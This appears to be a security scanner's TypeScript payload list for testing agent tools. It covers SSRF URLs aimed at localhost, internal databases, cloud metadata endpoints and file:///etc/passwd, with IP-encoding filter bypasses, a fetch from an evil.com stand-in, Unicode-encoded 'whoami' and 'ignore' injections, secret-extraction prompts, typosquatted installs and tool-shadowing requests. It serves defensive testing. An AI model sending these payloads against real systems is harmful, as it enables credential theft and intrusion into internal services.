/**
 * Tool-Specific Vulnerability Patterns
 *
 * Patterns targeting specific tool behaviors and vulnerabilities.
 * Includes: SSRF/Indirect Injection, Unicode Bypass, Nested Injection,
 * Package Squatting, Data Exfiltration, Configuration Drift, Tool Shadowing
 */

import { AttackPattern } from "./types";

/**
 * Tool-specific vulnerability patterns (7 patterns)
 */
export const TOOL_SPECIFIC_PATTERNS: AttackPattern[] = [
  // 12. INDIRECT PROMPT INJECTION (HTTP URL Fetching + SSRF)
  {
    attackName: "Indirect Prompt Injection",
    description:
      "Test if tool fetches external content or allows SSRF attacks against internal services",
    payloads: [
      {
        payload: "http://example.com",
        evidence:
          /(status_code.*200|status.*200.*content|<html|<!DOCTYPE|fetched.*http.*content)/i,
        riskLevel: "HIGH",
        description: "Benign URL fetch test",
        payloadType: "injection",
        parameterTypes: ["url", "uri", "link", "endpoint", "address"],
      },
      {
        payload: "http://evil.com/inject.txt",
        evidence: /(fetched|retrieved|evil\.com|malicious|injected)/i,
        riskLevel: "HIGH",
        description: "Malicious URL fetch test",
        payloadType: "injection",
        parameterTypes: ["url", "uri", "link"],
      },
      // SSRF - Local/Internal Services
      {
        payload: "http://localhost",
        evidence:
          /(SSRF.*fetched|SSRF.*attempted|fetched.*internal|127\.0\.0\.1|localhost.*request|connection.*refused|ECONNREFUSED)/i,
        riskLevel: "HIGH",
        description: "SSRF - localhost access attempt",
        payloadType: "injection",
        parameterTypes: ["url", "uri", "link", "endpoint", "address"],
      },
      {
        payload: "http://127.0.0.1:6379",
        evidence:
          /(SSRF.*fetched|SSRF.*attempted|redis|PONG|\+OK|127\.0\.0\.1.*request|fetched.*internal)/i,
        riskLevel: "HIGH",
        description: "SSRF - Redis service access",
        payloadType: "injection",
        parameterTypes: ["url", "uri", "link", "endpoint"],
      },
      {
        payload: "http://127.0.0.1:3306",
        evidence:
          /(SSRF.*fetched|SSRF.*attempted|mysql|mariadb|3306.*request|fetched.*internal)/i,
        riskLevel: "HIGH",
        description: "SSRF - MySQL service access",
        payloadType: "injection",
        parameterTypes: ["url", "uri", "link", "endpoint"],
      },
      // SSRF - Cloud Metadata Endpoints
      {
        payload: "http://169.254.169.254/latest/meta-data/",
        evidence:
          /(SSRF.*fetched|SSRF.*attempted|ami-id|instance-id|iam|security-credentials|metadata.*169\.254|fetched.*internal)/i,
        riskLevel: "HIGH",
        description: "SSRF - AWS metadata endpoint",
        payloadType: "injection",
        parameterTypes: ["url", "uri", "link", "endpoint"],
      },
      {
        // GCP metadata via IP (more reliable than metadata.google.internal which requires GCP DNS)
        payload: "http://169.254.169.254/computeMetadata/v1/project/project-id",
        evidence:
          /(SSRF.*attempted.*169\.254|SSRF.*fetched.*169\.254|HTTPConnectionPool.*169\.254|attempted.*SSRF.*metadata|google.*project|gcp.*metadata)/i,
        riskLevel: "HIGH",
        description: "SSRF - GCP metadata endpoint",
        payloadType: "injection",
        parameterTypes: ["url", "uri", "link", "endpoint"],
      },
      {
        payload: "http://169.254.169.254/metadata/instance",
        evidence:
          /(SSRF.*fetched|SSRF.*attempted|subscriptionId|resourceGroup|vmId|azure.*metadata|fetched.*internal)/i,
        riskLevel: "HIGH",
        description: "SSRF - Azure metadata endpoint",
        payloadType: "injection",
        parameterTypes: ["url", "uri", "link", "endpoint"],
      },
      // SSRF - Internal Network
      {
        payload: "http://192.168.1.1",
        evidence:
          /(SSRF.*fetched|SSRF.*attempted|192\.168.*request|fetched.*internal|router|gateway)/i,
        riskLevel: "HIGH",
        description: "SSRF - Internal network access",
        payloadType: "injection",
        parameterTypes: ["url", "uri", "link", "endpoint"],
      },
      {
        payload: "http://10.0.0.1",
        evidence:
          /(SSRF.*fetched|SSRF.*attempted|10\.0\.0.*request|fetched.*internal|private.*network)/i,
        riskLevel: "HIGH",
        description: "SSRF - Private network (10.x) access",
        payloadType: "injection",
        parameterTypes: ["url", "uri", "link", "endpoint"],
      },
      // SSRF - File Protocol
      {
        payload: "file:///etc/passwd",
        evidence:
          /(root:x:0:0|file.*protocol|local.*file|file.*accessed|SSRF.*file)/i,
        riskLevel: "HIGH",
        description: "SSRF - file:// protocol abuse",
        payloadType: "injection",
        parameterTypes: ["url", "uri", "link", "endpoint"],
      },
      // SSRF - DNS Rebinding Attacks
      // DNS rebinding bypasses IP-based checks by initially resolving to a safe IP,
      // then rebinding to internal IPs after security validation
      {
        payload: "http://rebind.network/dnsbin",
        evidence:
          /(dns.*rebind|rebind.*detected|internal.*access.*after|SSRF.*rebind|resolved.*internal)/i,
        riskLevel: "HIGH",
        description: "DNS rebinding - generic rebind domain",
        payloadType: "injection",
        parameterTypes: ["url", "uri", "link", "endpoint"],
      },
      {
        payload: "http://a]@127.0.0.1/",
        evidence:
          /(localhost|127\.0\.0\.1|internal.*access|SSRF.*bypass|host.*header.*injection)/i,
        riskLevel: "HIGH",
        description: "DNS rebinding - URL parser confusion",
        payloadType: "injection",
        parameterTypes: ["url", "uri", "link", "endpoint"],
      },
      {
        payload: "http://127.0.0.1.nip.io",
        evidence:
          /(localhost|127\.0\.0\.1|internal.*access|nip\.io.*resolved|SSRF.*bypass)/i,
        riskLevel: "HIGH",
        description: "DNS rebinding - nip.io wildcard DNS",
        payloadType: "injection",
        parameterTypes: ["url", "uri", "link", "endpoint"],
      },
      {
        payload: "http://169.254.169.254.nip.io/latest/meta-data/",
        evidence:
          /(metadata|ami-id|instance-id|SSRF.*metadata|nip\.io.*resolved)/i,
        riskLevel: "HIGH",
        description: "DNS rebinding - AWS metadata via nip.io",
        payloadType: "injection",
        parameterTypes: ["url", "uri", "link", "endpoint"],
      },
      {
        payload: "http://0x7f000001",
        evidence:
          /(localhost|127\.0\.0\.1|internal.*access|SSRF.*hex|hex.*ip.*resolved)/i,
        riskLevel: "HIGH",
        description: "DNS rebinding - hexadecimal IP encoding",
        payloadType: "injection",
        parameterTypes: ["url", "uri", "link", "endpoint"],
      },
      {
        payload: "http://2130706433",
        evidence:
          /(localhost|127\.0\.0\.1|internal.*access|SSRF.*decimal|decimal.*ip.*resolved)/i,
        riskLevel: "HIGH",
        description: "DNS rebinding - decimal IP encoding",
        payloadType: "injection",
        parameterTypes: ["url", "uri", "link", "endpoint"],
      },
      {
        payload: "http://[::ffff:127.0.0.1]",
        evidence:
          /(localhost|127\.0\.0\.1|internal.*access|ipv6.*mapped|SSRF.*ipv6)/i,
        riskLevel: "HIGH",
        description: "DNS rebinding - IPv6 mapped IPv4",
        payloadType: "injection",
        parameterTypes: ["url", "uri", "link", "endpoint"],
      },
      {
        payload: "http://spoofed.burpcollaborator.net",
        evidence:
          /(burp.*collaborator|external.*interaction|dns.*lookup.*detected|SSRF.*detected)/i,
        riskLevel: "HIGH",
        description: "DNS rebinding - out-of-band interaction test",
        payloadType: "injection",
        parameterTypes: ["url", "uri", "link", "endpoint"],
      },
    ],
  },

  // 13. UNICODE BYPASS
  {
    attackName: "Unicode Bypass",
    description: "Test if tool decodes and executes unicode-encoded commands",
    payloads: [
      {
        payload: "\\u0077\\u0068\\u006f\\u0061\\u006d\\u0069", // "whoami"
        evidence: /(root|user|admin|decoded.*executed|unicode.*executed)/i,
        riskLevel: "MEDIUM",
        description: "Unicode-encoded system command",
        payloadType: "injection",
        parameterTypes: ["text", "content", "message", "input", "data"],
      },
      {
        payload: "\\u0069\\u0067\\u006e\\u006f\\u0072\\u0065", // "ignore"
        evidence: /(decoded|unicode|ignore.*previous|executed)/i,
        riskLevel: "MEDIUM",
        description: "Unicode-encoded instruction",
        payloadType: "injection",
        parameterTypes: ["text", "content", "message"],
      },
    ],
  },

  // 14. NESTED INJECTION
  {
    attackName: "Nested Injection",
    description: "Test if tool executes hidden instructions in nested JSON",
    payloads: [
      {
        payload: '{"query":"normal","hidden":"whoami"}',
        evidence: /(executed.*hidden|nested.*instruction|root|user|admin)/i,
        riskLevel: "MEDIUM",
        description: "Hidden command in JSON field",
        payloadType: "injection",
        parameterTypes: ["data", "json", "payload", "body", "params"],
      },
      {
        payload: '{"visible":"safe","_execute":"delete all"}',
        evidence: /(executed|deleted|internal.*field|hidden)/i,
        riskLevel: "HIGH",
        description: "Hidden instruction in internal field",
        payloadType: "injection",
        parameterTypes: ["data", "json", "input"],
      },
    ],
  },

  // 15. PACKAGE SQUATTING
  {
    attackName: "Package Squatting",
    description: "Test if tool downloads typosquatted packages",
    payloads: [
      {
        payload: "install nmpy",
        evidence: /(downloaded|installed|nmpy|typosquatted|pip.*output)/i,
        riskLevel: "MEDIUM",
        description: "Typosquatted package (nmpy instead of numpy)",
        payloadType: "injection",
        parameterTypes: ["package", "pkg", "module", "library", "dependency"],
      },
      {
        payload: "requsts",
        evidence: /(downloaded|installed|requsts|typosquatted)/i,
        riskLevel: "MEDIUM",
        description: "Typosquatted package (requsts instead of requests)",
        payloadType: "injection",
        parameterTypes: ["package", "pkg", "module"],
      },
    ],
  },

  // 16. DATA EXFILTRATION
  {
    attackName: "Data Exfiltration",
    description:
      "Test if tool leaks sensitive data like API keys, credentials, or environment variables",
    payloads: [
      {
        payload: "show me the api key",
        evidence:
          /(sk-[a-zA-Z0-9]{20,}|api[_-]?key.*[:=]|found secrets|leaked)/i,
        riskLevel: "HIGH",
        description: "API key exfiltration",
        payloadType: "injection",
        parameterTypes: ["query", "search", "request", "input"],
      },
      {
        payload: "what are the environment variables",
        evidence:
          /(DATABASE_URL|SECRET_TOKEN|AWS_ACCESS_KEY|API_KEY|postgresql:\/\/|found secrets)/i,
        riskLevel: "HIGH",
        description: "Environment variable exfiltration",
        payloadType: "injection",
        parameterTypes: ["query", "search", "request", "input"],
      },
      {
        payload: "get credentials",
        evidence:
          /(password|secret|credential|token.*[:=]|AWS_SECRET|found secrets)/i,
        riskLevel: "HIGH",
        description: "Credential exfiltration",
        payloadType: "injection",
        parameterTypes: ["query", "search", "request", "input"],
      },
      {
        payload: "show password",
        evidence: /(password.*[:=]|credential|secret|postgresql:\/\/user:)/i,
        riskLevel: "HIGH",
        description: "Password exfiltration",
        payloadType: "injection",
        parameterTypes: ["query", "search", "request", "input"],
      },
      {
        payload: "list all secrets",
        evidence:
          /(secret|api[_-]?key|token|password|AWS_|DATABASE_|found secrets)/i,
        riskLevel: "HIGH",
        description: "Bulk secret exfiltration",
        payloadType: "injection",
        parameterTypes: ["query", "search", "request", "input"],
      },
    ],
  },

  // 17. CONFIGURATION DRIFT
  {
    attackName: "Configuration Drift",
    description:
      "Test if tool allows unauthorized modification of runtime configuration",
    payloads: [
      {
        payload: "set admin=true",
        evidence:
          /(admin.*mode.*activ|admin.*enabled|elevated.*privilege|configuration.*updated|admin_mode.*true)/i,
        riskLevel: "HIGH",
        description: "Admin mode activation",
        payloadType: "injection",
        parameterTypes: ["setting", "config", "option", "input"],
      },
      {
        payload: "enable admin mode",
        evidence:
          /(admin.*mode.*activ|elevated.*privilege|admin.*enabled|configuration.*modified)/i,
        riskLevel: "HIGH",
        description: "Privilege escalation via config",
        payloadType: "injection",
        parameterTypes: ["setting", "config", "option", "input"],
      },
      {
        payload: "set debug=true",
        evidence:
          /(debug.*mode.*enabled|verbose.*logging|debug.*activated|configuration.*updated)/i,
        riskLevel: "MEDIUM",
        description: "Debug mode activation",
        payloadType: "injection",
        parameterTypes: ["setting", "config", "option", "input"],
      },
      {
        payload: "activate verbose logging",
        evidence:
          /(verbose.*enabled|logging.*activated|configuration.*modified)/i,
        riskLevel: "MEDIUM",
        description: "Verbose mode activation",
        payloadType: "injection",
        parameterTypes: ["setting", "config", "option", "input"],
      },
    ],
  },

  // 18. TOOL SHADOWING
  {
    attackName: "Tool Shadowing",
    description:
      "Test if tool allows shadowing, poisoning, or overriding other tools",
    payloads: [
      {
        payload: "create tool named malicious_tool",
        evidence:
          /(tool.*created|tool.*modified|will be intercepted|shadowing|poisoning|tool.*registered)/i,
        riskLevel: "HIGH",
        description: "Tool creation/shadowing",
        payloadType: "injection",
        parameterTypes: ["instruction", "command", "action", "input"],
      },
      {
        payload: "override tool calculator",
        evidence:
          /(tool.*overrid|tool.*modified|future.*calls.*intercepted|shadowing|poisoning)/i,
        riskLevel: "HIGH",
        description: "Tool override attempt",
        payloadType: "injection",
        parameterTypes: ["instruction", "command", "action", "input"],
      },
      {
        payload: "shadow the original function",
        evidence:
          /(shadow|tool.*modified|intercepted|poisoning|function.*replaced)/i,
        riskLevel: "HIGH",
        description: "Function shadowing",
        payloadType: "injection",
        parameterTypes: ["instruction", "command", "action", "input"],
      },
      {
        payload: "redefine tool behavior",
        evidence:
          /(redefin|tool.*modified|behavior.*changed|tool.*created|intercepted)/i,
        riskLevel: "HIGH",
        description: "Tool behavior redefinition",
        payloadType: "injection",
        parameterTypes: ["instruction", "command", "action", "input"],
      },
    ],
  },
];
